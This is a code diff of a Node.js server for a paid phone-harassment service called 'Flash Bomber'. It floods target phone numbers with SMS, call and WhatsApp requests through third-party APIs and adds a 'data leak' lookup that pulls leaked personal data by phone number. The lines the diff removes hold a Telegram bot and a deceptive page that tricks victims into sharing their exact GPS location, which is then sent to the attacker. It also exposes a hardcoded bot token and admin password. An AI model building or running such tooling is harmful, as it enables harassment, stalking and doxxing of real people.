@@ -22,44 +22,52 @@ const io = socketIo(server, {
 });
 
 const PORT = 5500;
+const ADMIN_PASSWORD = "shaiqua@74567";
 
 // Middleware
 app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(requestIp.mw());
-app.use(express.static(path.join(__dirname, '/')));
+
+// Serve static files
+app.use(express.static(path.join(__dirname, 'public')));
+app.use('/admin', express.static(path.join(__dirname, 'admin')));
+
+// Create directories if not exist
+if (!fs.existsSync('./public')) fs.mkdirSync('./public');
+if (!fs.existsSync('./admin')) fs.mkdirSync('./admin');
 
 // Load APIs
-let apisData;
+let apisData = { apis: [] };
 try {
-  apisData = JSON.parse(fs.readFileSync('./apis.json', 'utf8'));
-  console.log(`✅ Loaded ${apisData.apis.length} APIs`);
+  if (fs.existsSync('./apis.json')) {
+    const apisContent = fs.readFileSync('./apis.json', 'utf8');
+    apisData = JSON.parse(apisContent);
+    console.log(`✅ Loaded ${apisData.apis.length} APIs`);
+  } else {
+    console.log('❌ apis.json not found');
+  }
 } catch (error) {
-  console.log('❌ Error loading APIs, creating default:', error);
-  apisData = { apis: [] };
-  fs.writeFileSync('./apis.json', JSON.stringify(apisData, null, 2));
+  console.log('❌ Error loading APIs:', error.message);
 }
 
 // Database
 let database = {
   users: [],
+  keys: [],
   attacks: [],
   locations: [],
-  botUsers: [],
-  logs: [],
-  trackings: [] // Added trackings array
+  logs: []
 };
 
 try {
   if (fs.existsSync('./database.json')) {
     database = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
-    // Ensure trackings array exists
-    if (!database.trackings) database.trackings = [];
   } else {
     fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
   }
-  console.log(`✅ Loaded ${database.users.length} users, ${database.locations.length} locations`);
+  console.log(`✅ Loaded ${database.users.length} users, ${database.keys.length} keys`);
 } catch (error) {
   console.log('❌ Error loading database');
 }
@@ -81,701 +89,70 @@ function addLog(type, message, data = {}) {
   database.logs.push(log);
   if (database.logs.length > 1000) database.logs = database.logs.slice(-1000);
   saveDatabase();
-  
-  // Emit to admin
   io.emit('new-log', log);
-  
   return log;
 }
 
-// =============== TELEGRAM BOT SETUP ===============
-const TELEGRAM_TOKEN = '8750510514:AAG8cgcVULCGXXc8cmYYlnddEiEjDsO34Ik';
-let bot;
+// =============== KEY GENERATION FUNCTIONS ===============
 
-try {
-  const TelegramBot = require('node-telegram-bot-api');
-  bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+// Generate unique key
+function generateKey(plan = 'basic', duration = 30) {
+  const prefix = plan === 'premium' ? 'PRM' : plan === 'vip' ? 'VIP' : 'BAS';
+  const random = crypto.randomBytes(12).toString('hex').toUpperCase();
+  const key = `${prefix}-${random.substring(0, 4)}-${random.substring(4, 8)}-${random.substring(8, 12)}-${random.substring(12, 16)}`;
   
-  console.log('🤖 Telegram Bot Started!');
+  const keyData = {
+    key: key,
+    plan: plan,
+    duration: duration,
+    createdAt: new Date().toISOString(),
+    expiresAt: new Date(Date.now() + duration * 24 * 60 * 60 * 1000).toISOString(),
+    used: false,
+    usedBy: null,
+    usedAt: null
+  };
   
-  // Handle /start command
-  bot.onText(/\/start/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const username = msg.from.username || 'No username';
-    const firstName = msg.from.first_name || '';
-    const lastName = msg.from.last_name || '';
-    
-    // Save bot user
-    let botUser = null;
-    for (let i = 0; i < database.botUsers.length; i++) {
-      if (database.botUsers[i].telegramId === userId) {
-        botUser = database.botUsers[i];
-        break;
-      }
-    }
-    
-    if (!botUser) {
-      botUser = {
-        telegramId: userId,
-        username,
-        firstName,
-        lastName,
-        chatId,
-        joinedAt: new Date().toISOString(),
-        lastActive: new Date().toISOString(),
-        isAdmin: false,
-        attacksDone: 0
-      };
-      database.botUsers.push(botUser);
-      saveDatabase();
-    }
-    
-    const welcomeMessage = `
-╔══════════════════════════════════╗
-║    🤖 FLASH BOMBER BOT ACTIVE    ║
-╚══════════════════════════════════╝
-
-👋 Welcome *${firstName}*!
-
-🔹 *User ID*: \`${userId}\`
-🔹 *Username*: @${username}
-🔹 *Status*: ✅ Active
-
-🎯 *Commands*:
-/attack [number] - Start attack
-/locate [number] - Track location
-/stats - Your stats
-/help - Get help
-
-⚡ Powered by Flash Bomber
-    `;
-    
-    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
-    
-    addLog('bot', `New bot user: ${firstName} (@${username})`, { userId, chatId });
-  });
+  database.keys.push(keyData);
+  saveDatabase();
+  addLog('key', `Generated ${plan} key: ${key}`, { plan, duration });
   
-  // Handle attack command
-  bot.onText(/\/attack (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const phone = match[1].replace(/\D/g, '');
-    
-    if (!phone || phone.length !== 10) {
-      return bot.sendMessage(chatId, '❌ Please enter valid 10-digit number!\nExample: /attack 9876543210');
-    }
-    
-    bot.sendMessage(chatId, `⚡ Starting attack on +91${phone}...`);
-    
-    // Get bot user
-    let botUser = null;
-    for (let i = 0; i < database.botUsers.length; i++) {
-      if (database.botUsers[i].telegramId === userId) {
-        botUser = database.botUsers[i];
-        break;
-      }
-    }
-    
-    if (!botUser) return;
-    
-    botUser.lastActive = new Date().toISOString();
-    botUser.attacksDone = (botUser.attacksDone || 0) + 1;
-    saveDatabase();
-    
-    // Start attack
-    try {
-      const apisToUse = apisData.apis;
-      let totalSent = 0;
-      
-      for (const api of apisToUse) {
-        try {
-          await callApi(api, phone);
-          totalSent++;
-          
-          if (totalSent % 10 === 0) {
-            bot.sendMessage(chatId, `📊 Progress: ${totalSent}/${apisToUse.length} requests sent...`);
-          }
-        } catch (e) {}
-      }
-      
-      bot.sendMessage(chatId, `
-✅ *Attack Completed!*
-
-📱 Target: +91${phone}
-📊 Total: ${totalSent} requests sent
-⚡ Status: Success
-
-_Attacks remaining: Unlimited_
-      `, { parse_mode: 'Markdown' });
-      
-    } catch (error) {
-      bot.sendMessage(chatId, '❌ Attack failed. Please try again.');
-    }
-  });
-  
-  // Handle location tracking
-  bot.onText(/\/locate (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const phone = match[1].replace(/\D/g, '');
-    
-    if (!phone || phone.length !== 10) {
-      return bot.sendMessage(chatId, '❌ Please enter valid 10-digit number!\nExample: /locate 9876543210');
-    }
-    
-    // Generate tracking link
-    const trackingId = crypto.randomBytes(16).toString('hex');
-    const trackingUrl = `http://your-domain.com/track/${trackingId}?phone=${phone}`;
-    
-    bot.sendMessage(chatId, `
-📍 *Location Tracking Link Generated*
-
-🔗 *Link*: \`${trackingUrl}\`
-
-📱 Target: +91${phone}
-
-⚠️ Send this link to the target. When they click and allow location permission, you'll receive their exact location here.
-
-⏱️ Link expires in: 30 minutes
-    `, { parse_mode: 'Markdown' });
-    
-    // Store tracking info
-    const tracking = {
-      id: trackingId,
-      phone,
-      userId: msg.from.id,
-      chatId,
-      createdAt: new Date().toISOString(),
-      expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
-      location: null
-    };
-    
-    if (!database.trackings) database.trackings = [];
-    database.trackings.push(tracking);
-    saveDatabase();
-  });
-  
-  // Handle stats
-  bot.onText(/\/stats/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    let botUser = null;
-    for (let i = 0; i < database.botUsers.length; i++) {
-      if (database.botUsers[i].telegramId === userId) {
-        botUser = database.botUsers[i];
-        break;
-      }
-    }
-    
-    if (!botUser) return;
-    
-    const stats = `
-📊 *Your Stats*
-
-🆔 User ID: \`${userId}\`
-📝 Username: @${botUser.username}
-📅 Joined: ${moment(botUser.joinedAt).format('DD/MM/YYYY')}
-⚡ Attacks Done: ${botUser.attacksDone || 0}
-💎 Account Type: ${botUser.isAdmin ? 'ADMIN' : 'Regular User'}
-
-🌐 Total Attacks Today: ${database.attacks.filter(a => moment(a.timestamp).isSame(new Date(), 'day')).length}
-📱 APIs Available: ${apisData.apis.length}
-    `;
-    
-    bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
-  });
-  
-  // Handle help
-  bot.onText(/\/help/, async (msg) => {
-    const chatId = msg.chat.id;
-    
-    const help = `
-📚 *Commands Guide*
-
-⚡ *Attack Commands*
-/attack [number] - Start SMS/Call bombing
-/locate [number] - Generate location tracker
-/bomb [number] - Quick attack (1 min)
-
-📊 *Info Commands*
-/stats - View your statistics
-/status - Check system status
-/apis - List available APIs
-
-👑 *Admin Commands*
-/broadcast [msg] - Send to all users
-/adduser [id] - Add paid user
-/removeuser [id] - Remove user
-/statsall - View all stats
-
-📞 *Contact Admin*
-🔹 Telegram: @introvert_O2z
-🔹 Support: 24/7 Available
-    `;
-    
-    bot.sendMessage(chatId, help, { parse_mode: 'Markdown' });
-  });
-  
-  // Handle broadcast (admin only)
-  bot.onText(/\/broadcast (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const message = match[1];
-    
-    let botUser = null;
-    for (let i = 0; i < database.botUsers.length; i++) {
-      if (database.botUsers[i].telegramId === userId) {
-        botUser = database.botUsers[i];
-        break;
-      }
-    }
-    
-    if (!botUser || !botUser.isAdmin) {
-      return bot.sendMessage(chatId, '❌ Admin only command!');
-    }
-    
-    let sent = 0;
-    let failed = 0;
-    
-    for (const user of database.botUsers) {
-      try {
-        await bot.sendMessage(user.chatId, `📢 *BROADCAST*\n\n${message}\n\n- Admin`, { parse_mode: 'Markdown' });
-        sent++;
-      } catch (e) {
-        failed++;
-      }
-    }
-    
-    bot.sendMessage(chatId, `✅ Broadcast sent!\n📨 Sent: ${sent}\n❌ Failed: ${failed}`);
-  });
-  
-} catch (error) {
-  console.log('❌ Telegram Bot Error:', error.message);
+  return keyData;
 }
 
-// =============== LOCATION TRACKING ENDPOINTS ===============
+// Validate key
+function validateKey(key) {
+  const keyData = database.keys.find(k => k.key === key);
+  
+  if (!keyData) {
+    return { valid: false, message: 'Invalid key' };
+  }
+  
+  if (keyData.used) {
+    return { valid: false, message: 'Key already used' };
+  }
+  
+  if (new Date() > new Date(keyData.expiresAt)) {
+    return { valid: false, message: 'Key expired' };
+  }
+  
+  return { valid: true, keyData };
+}
 
-// Serve tracking page
-app.get('/track/:trackingId', (req, res) => {
-  const trackingId = req.params.trackingId;
-  const phone = req.query.phone || '';
+// Use key
+function useKey(key, userId) {
+  const keyData = database.keys.find(k => k.key === key);
+  if (!keyData) return false;
   
-  // Get tracking info
-  let tracking = null;
-  if (database.trackings) {
-    for (let i = 0; i < database.trackings.length; i++) {
-      if (database.trackings[i].id === trackingId) {
-        tracking = database.trackings[i];
-        break;
-      }
-    }
-  }
-  
-  if (!tracking) {
-    return res.status(404).send('Invalid or expired link');
-  }
-  
-  if (new Date() > new Date(tracking.expiresAt)) {
-    return res.status(410).send('Link expired');
-  }
-  
-  // Get client info
-  const clientIp = req.clientIp;
-  const agent = useragent.parse(req.headers['user-agent']);
-  const geo = geoip.lookup(clientIp);
-  
-  // Send HTML with location request
-  res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Location Access Required</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            animation: slideIn 0.5s ease;
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateY(-50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
-        .icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 28px;
-        }
-        
-        p {
-            color: #666;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
-        
-        .location-box {
-            background: #f7f7f7;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-            display: none;
-        }
-        
-        .location-box.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        .coordinates {
-            font-family: monospace;
-            font-size: 18px;
-            color: #667eea;
-            font-weight: bold;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            width: 100%;
-            margin-bottom: 15px;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
-        }
-        
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        
-        .status {
-            color: #28a745;
-            font-weight: bold;
-            margin-top: 15px;
-            display: none;
-        }
-        
-        .status.error {
-            color: #dc3545;
-        }
-        
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-            display: none;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .info {
-            background: #e3f2fd;
-            border-radius: 8px;
-            padding: 10px;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #1976d2;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="icon">📍</div>
-        <h1>Location Access Required</h1>
-        <p>To continue, please allow access to your location. This helps us provide better service and verify your identity.</p>
-        
-        <div class="location-box" id="locationBox">
-            <p style="color: #333; margin-bottom: 10px;">✅ Location Captured!</p>
-            <div class="coordinates" id="coordinates"></div>
-            <p style="color: #666; margin-top: 15px; font-size: 14px;">Sending to server...</p>
-        </div>
-        
-        <div class="loader" id="loader"></div>
-        
-        <button class="btn" id="allowBtn" onclick="requestLocation()">
-            🔓 ALLOW LOCATION ACCESS
-        </button>
-        
-        <button class="btn" id="continueBtn" style="background: #28a745; display: none;" onclick="continueToSite()">
-            ✅ Continue to Website
-        </button>
-        
-        <div class="status" id="status"></div>
-        
-        <div class="info">
-            🔒 Your privacy is important. Location is only used for verification.
-        </div>
-    </div>
-
-    <script>
-        const trackingId = '${trackingId}';
-        const phone = '${phone}';
-        
-        function requestLocation() {
-            const allowBtn = document.getElementById('allowBtn');
-            const loader = document.getElementById('loader');
-            const status = document.getElementById('status');
-            
-            allowBtn.disabled = true;
-            loader.style.display = 'block';
-            status.style.display = 'none';
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    // Success
-                    async (position) => {
-                        const { latitude, longitude, accuracy } = position.coords;
-                        
-                        // Get additional info
-                        const timestamp = new Date().toISOString();
-                        const userAgent = navigator.userAgent;
-                        const platform = navigator.platform;
-                        const language = navigator.language;
-                        
-                        // Send to server
-                        try {
-                            const response = await fetch('/api/track-location', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    trackingId,
-                                    phone,
-                                    latitude,
-                                    longitude,
-                                    accuracy,
-                                    timestamp,
-                                    userAgent,
-                                    platform,
-                                    language
-                                })
-                            });
-                            
-                            const data = await response.json();
-                            
-                            loader.style.display = 'none';
-                            
-                            if (data.success) {
-                                document.getElementById('locationBox').classList.add('active');
-                                document.getElementById('coordinates').innerHTML = 
-                                    \`Lat: \${latitude.toFixed(6)}<br>Lng: \${longitude.toFixed(6)}<br>Accuracy: ±\${accuracy.toFixed(1)}m\`;
-                                
-                                status.style.display = 'block';
-                                status.className = 'status';
-                                status.innerHTML = '✅ Location captured and sent successfully!';
-                                
-                                document.getElementById('continueBtn').style.display = 'block';
-                            } else {
-                                throw new Error('Server error');
-                            }
-                        } catch (error) {
-                            loader.style.display = 'none';
-                            status.style.display = 'block';
-                            status.className = 'status error';
-                            status.innerHTML = '❌ Error sending location. Please try again.';
-                            allowBtn.disabled = false;
-                        }
-                    },
-                    // Error
-                    (error) => {
-                        loader.style.display = 'none';
-                        status.style.display = 'block';
-                        status.className = 'status error';
-                        
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                status.innerHTML = '❌ Location access denied. Please allow access and try again.';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                status.innerHTML = '❌ Location information unavailable.';
-                                break;
-                            case error.TIMEOUT:
-                                status.innerHTML = '❌ Location request timed out.';
-                                break;
-                            default:
-                                status.innerHTML = '❌ An unknown error occurred.';
-                        }
-                        
-                        allowBtn.disabled = false;
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                loader.style.display = 'none';
-                status.style.display = 'block';
-                status.className = 'status error';
-                status.innerHTML = '❌ Geolocation is not supported by this browser.';
-                allowBtn.disabled = false;
-            }
-        }
-        
-        function continueToSite() {
-            window.location.href = 'https://www.google.com';
-        }
-    </script>
-</body>
-</html>
-  `);
-});
-
-// Receive location
-app.post('/api/track-location', (req, res) => {
-  const { trackingId, phone, latitude, longitude, accuracy, timestamp, userAgent, platform, language } = req.body;
-  const clientIp = req.clientIp;
-  const geo = geoip.lookup(clientIp);
-  
-  // Get tracking info
-  let tracking = null;
-  if (database.trackings) {
-    for (let i = 0; i < database.trackings.length; i++) {
-      if (database.trackings[i].id === trackingId) {
-        tracking = database.trackings[i];
-        break;
-      }
-    }
-  }
-  
-  if (!tracking) {
-    return res.json({ success: false, error: 'Invalid tracking ID' });
-  }
-  
-  // Save location
-  const locationData = {
-    id: crypto.randomBytes(8).toString('hex'),
-    trackingId,
-    phone,
-    latitude,
-    longitude,
-    accuracy,
-    timestamp,
-    clientIp,
-    geo: geo || null,
-    userAgent,
-    platform,
-    language,
-    userId: tracking.userId,
-    chatId: tracking.chatId,
-    capturedAt: new Date().toISOString()
-  };
-  
-  database.locations.push(locationData);
+  keyData.used = true;
+  keyData.usedBy = userId;
+  keyData.usedAt = new Date().toISOString();
   saveDatabase();
   
-  // Send to Telegram
-  if (bot) {
-    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const locationMessage = `
-📍 *LOCATION CAPTURED!*
+  return keyData;
+}
 
-📱 *Phone*: +91${phone}
-🌐 *Coordinates*: \`${latitude}, ${longitude}\`
-🎯 *Accuracy*: ±${accuracy} meters
-🕐 *Time*: ${moment().format('DD/MM/YYYY HH:mm:ss')}
+// =============== API CALL FUNCTION ===============
 
-🔗 *Google Maps*: [Click to view](${googleMapsLink})
-
-📊 *Device Info*:
-• Platform: ${platform}
-• Language: ${language}
-• IP: ${clientIp}
-• Country: ${(geo && geo.country) || 'Unknown'}
-• City: ${(geo && geo.city) || 'Unknown'}
-
-⚡ *Tracking ID*: \`${trackingId}\`
-    `;
-    
-    bot.sendMessage(tracking.chatId, locationMessage, { parse_mode: 'Markdown' });
-    
-    // Try to send actual location
-    try {
-      bot.sendLocation(tracking.chatId, latitude, longitude);
-    } catch (e) {}
-  }
-  
-  addLog('location', `Location captured for +91${phone}`, locationData);
-  
-  res.json({ success: true, location: locationData });
-});
-
-// =============== SOUND EFFECTS ENDPOINT ===============
-app.get('/api/sounds/:sound', (req, res) => {
-  const sound = req.params.sound;
-  
-  // Base64 encoded sound effects
-  const sounds = {
-    'attack-start': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
-    'attack-stop': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
-    'success': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
-    'error': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...',
-    'notification': 'data:audio/wav;base64,//uQZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...'
-  };
-  
-  res.json({ sound: sounds[sound] || sounds['notification'] });
-});
-
-// =============== ATTACK FUNCTIONS ===============
-
-// Call single API
 async function callApi(api, phone) {
   try {
     let url = api.url;
@@ -802,27 +179,131 @@ async function callApi(api, phone) {
       }
     }
 
-    // Make request
     const response = await axios({
       method: api.method,
       url: url,
       headers: api.headers || {},
       data: data,
-      timeout: 3000
+      timeout: 5000
     });
 
-    return response.status >= 200 && response.status < 300;
-    
+    return { success: true, status: response.status };
   } catch (error) {
-    return false;
+    return { success: false, error: error.message };
   }
 }
 
-// Start attack endpoint
-app.post('/api/attack', async (req, res) => {
-  const { phone, duration, speed, userId, isTrial } = req.body;
+// =============== DATA LEAK API FUNCTIONS ===============
+
+async function fetchDataLeak(api, phone) {
+  try {
+    let url = api.url.replace(/{phone}/g, phone);
+    
+    const response = await axios({
+      method: api.method,
+      url: url,
+      headers: api.headers || {},
+      timeout: 8000
+    });
+
+    return { success: true, data: response.data };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+}
+
+// =============== API ENDPOINTS ===============
+
+// Validate key
+app.post('/api/validate-key', (req, res) => {
+  const { key, userId } = req.body;
   
-  console.log(`⚡ Attack started: ${phone} for ${duration}s (Speed: ${speed})`);
+  const validation = validateKey(key);
+  
+  if (validation.valid) {
+    // Use the key
+    useKey(key, userId);
+    
+    // Create or update user
+    let user = database.users.find(u => u.id === userId);
+    if (!user) {
+      user = {
+        id: userId,
+        key: key,
+        plan: validation.keyData.plan,
+        activatedAt: new Date().toISOString(),
+        expiresAt: validation.keyData.expiresAt,
+        attacksDone: 0
+      };
+      database.users.push(user);
+    } else {
+      user.key = key;
+      user.plan = validation.keyData.plan;
+      user.activatedAt = new Date().toISOString();
+      user.expiresAt = validation.keyData.expiresAt;
+    }
+    saveDatabase();
+    
+    res.json({ 
+      success: true, 
+      message: 'Key validated successfully',
+      user: {
+        plan: validation.keyData.plan,
+        expiresAt: validation.keyData.expiresAt
+      }
+    });
+  } else {
+    res.json({ success: false, message: validation.message });
+  }
+});
+
+// Check user status
+app.post('/api/user-status', (req, res) => {
+  const { userId } = req.body;
+  
+  const user = database.users.find(u => u.id === userId);
+  
+  if (!user) {
+    return res.json({ 
+      active: false,
+      message: 'No active subscription'
+    });
+  }
+  
+  if (new Date() > new Date(user.expiresAt)) {
+    return res.json({ 
+      active: false,
+      message: 'Subscription expired'
+    });
+  }
+  
+  res.json({
+    active: true,
+    plan: user.plan,
+    expiresAt: user.expiresAt,
+    attacksDone: user.attacksDone
+  });
+});
+
+// Get all APIs
+app.get('/api/apis', (req, res) => {
+  res.json({
+    total: apisData.apis.length,
+    apis: apisData.apis
+  });
+});
+
+// Start attack
+app.post('/api/attack', async (req, res) => {
+  const { phone, duration, speed, userId } = req.body;
+  
+  // Verify user
+  const user = database.users.find(u => u.id === userId);
+  if (!user || new Date() > new Date(user.expiresAt)) {
+    return res.json({ success: false, message: 'Invalid or expired subscription' });
+  }
+  
+  console.log(`⚡ Attack started: ${phone} for ${duration}s by user ${userId}`);
   addLog('attack', `Attack started on +91${phone}`, { phone, duration, speed, userId });
   
   // Set headers for SSE
@@ -839,27 +320,17 @@ app.post('/api/attack', async (req, res) => {
   let successRequests = 0;
   let failedRequests = 0;
   
-  // Get APIs to use
-  const apisToUse = apisData.apis;
-  const batchSize = speed === 5 ? apisToUse.length : Math.floor(apisToUse.length * (speed / 5));
+  // Filter SMS and Call APIs only
+  const smsApis = apisData.apis.filter(api => api.type === 'SMS' || api.type === 'Call' || api.type === 'WhatsApp');
+  const batchSize = speed === 5 ? smsApis.length : Math.floor(smsApis.length * (speed / 5));
   
-  // Attack loop
   const attackInterval = setInterval(async () => {
     const now = Date.now();
     
     if (now >= endTime) {
       clearInterval(attackInterval);
       
-      // Log attack
-      database.attacks.push({
-        userId,
-        phone,
-        duration,
-        totalRequests,
-        successRequests,
-        failedRequests,
-        timestamp: new Date().toISOString()
-      });
+      user.attacksDone = (user.attacksDone || 0) + 1;
       saveDatabase();
       
       addLog('attack', `Attack completed on +91${phone}`, { totalRequests, successRequests, failedRequests });
@@ -874,32 +345,26 @@ app.post('/api/attack', async (req, res) => {
       return;
     }
 
-    // Call APIs in parallel
     const promises = [];
     
     for (let i = 0; i < batchSize; i++) {
-      const api = apisToUse[i % apisToUse.length];
-      
-      // Call multiple times based on count
+      const api = smsApis[i % smsApis.length];
       for (let j = 0; j < (api.count || 1); j++) {
         promises.push(callApi(api, phone));
       }
     }
 
-    // Execute all promises
     const results = await Promise.allSettled(promises);
     
-    // Count results
     results.forEach(result => {
       totalRequests++;
-      if (result.status === 'fulfilled' && result.value) {
+      if (result.status === 'fulfilled' && result.value.success) {
         successRequests++;
       } else {
         failedRequests++;
       }
     });
 
-    // Send update
     const elapsed = Math.floor((Date.now() - startTime) / 1000);
     const progress = (elapsed / duration) * 100;
     const rps = totalRequests / elapsed || 0;
@@ -917,289 +382,147 @@ app.post('/api/attack', async (req, res) => {
   }, 1000);
 });
 
-// =============== API ENDPOINTS ===============
-
-// Get all APIs
-app.get('/api/apis', (req, res) => {
+// Data leak search
+app.post('/api/data-leak', async (req, res) => {
+  const { phone, userId } = req.body;
+  
+  // Verify user
+  const user = database.users.find(u => u.id === userId);
+  if (!user || new Date() > new Date(user.expiresAt)) {
+    return res.json({ success: false, message: 'Invalid or expired subscription' });
+  }
+  
+  // Filter data leak APIs
+  const dataApis = apisData.apis.filter(api => api.type === 'Data');
+  
+  const results = [];
+  
+  for (const api of dataApis) {
+    const result = await fetchDataLeak(api, phone);
+    results.push({
+      name: api.name,
+      ...result
+    });
+  }
+  
+  addLog('data', `Data leak search for +91${phone}`, { results: results.length });
+  
   res.json({
-    total: apisData.apis.length,
-    apis: apisData.apis
-  });
-});
-
-// User registration
-app.post('/api/register', (req, res) => {
-  const { userId, name } = req.body;
-  
-  let user = null;
-  for (let i = 0; i < database.users.length; i++) {
-    if (database.users[i].id === userId) {
-      user = database.users[i];
-      break;
-    }
-  }
-  
-  if (!user) {
-    user = {
-      id: userId,
-      name: name || `User_${userId}`,
-      trialUsed: 0,
-      trialBlocked: false,
-      isPaid: false,
-      attacksDone: 0,
-      registeredAt: new Date().toISOString()
-    };
-    database.users.push(user);
-    saveDatabase();
-    addLog('user', `New user registered: ${userId}`, { userId });
-  }
-  
-  res.json({ success: true, user });
-});
-
-// Use trial
-app.post('/api/use-trial', (req, res) => {
-  const { userId } = req.body;
-  
-  let user = null;
-  for (let i = 0; i < database.users.length; i++) {
-    if (database.users[i].id === userId) {
-      user = database.users[i];
-      break;
-    }
-  }
-  
-  if (!user) {
-    return res.json({ success: false, message: 'User not found' });
-  }
-  
-  if (user.trialUsed > 0 || user.trialBlocked) {
-    return res.json({ success: false, message: 'Trial already used' });
-  }
-  
-  if (user.isPaid) {
-    return res.json({ success: false, message: 'Paid users cannot use trial' });
-  }
-  
-  user.trialUsed = 1;
-  user.trialBlocked = true;
-  saveDatabase();
-  
-  res.json({ success: true, message: 'Trial activated' });
-});
-
-// Get locations
-app.get('/api/locations', (req, res) => {
-  res.json(database.locations);
-});
-
-// Get logs
-app.get('/api/logs', (req, res) => {
-  res.json(database.logs);
-});
-
-// =============== SOCKET.IO ===============
-io.on('connection', (socket) => {
-  console.log('🔌 Client connected:', socket.id);
-  
-  socket.on('join-admin', (password) => {
-    if (password === 'shaiqua@74567') {
-      socket.join('admin');
-      socket.emit('admin-joined', true);
-      addLog('socket', 'Admin joined', { socketId: socket.id });
-    }
-  });
-  
-  socket.on('disconnect', () => {
-    console.log('🔌 Client disconnected:', socket.id);
+    success: true,
+    results: results
   });
 });
 
 // =============== ADMIN ENDPOINTS ===============
 
 // Admin login
-app.post('/api/admin/login', (req, res) => {
+app.post('/admin/api/login', (req, res) => {
   const { password } = req.body;
   
-  if (password === 'shaiqua@74567') {
-    res.json({ success: true });
+  if (password === ADMIN_PASSWORD) {
+    const token = crypto.randomBytes(32).toString('hex');
+    res.json({ success: true, token });
   } else {
     res.json({ success: false });
   }
 });
 
-// Get all users
-app.get('/api/admin/users', (req, res) => {
-  res.json(database.users);
+// Generate key (admin only)
+app.post('/admin/api/generate-key', (req, res) => {
+  const { plan, duration, adminToken } = req.body;
+  
+  // Simple token check
+  if (!adminToken) {
+    return res.json({ success: false, message: 'Unauthorized' });
+  }
+  
+  const key = generateKey(plan, duration);
+  
+  res.json({
+    success: true,
+    key: key.key,
+    plan: key.plan,
+    expiresAt: key.expiresAt
+  });
 });
 
-// Add paid user
-app.post('/api/admin/add-user', (req, res) => {
-  const { userId, username } = req.body;
+// Get all keys (admin only)
+app.post('/admin/api/keys', (req, res) => {
+  const { adminToken } = req.body;
   
-  let user = null;
-  for (let i = 0; i < database.users.length; i++) {
-    if (database.users[i].id === userId) {
-      user = database.users[i];
-      break;
-    }
-  }
-  
-  if (!user) {
-    user = {
-      id: userId,
-      name: username || `User_${userId}`,
-      trialUsed: 1,
-      trialBlocked: true,
-      isPaid: true,
-      attacksDone: 0,
-      registeredAt: new Date().toISOString()
-    };
-    database.users.push(user);
-  } else {
-    user.isPaid = true;
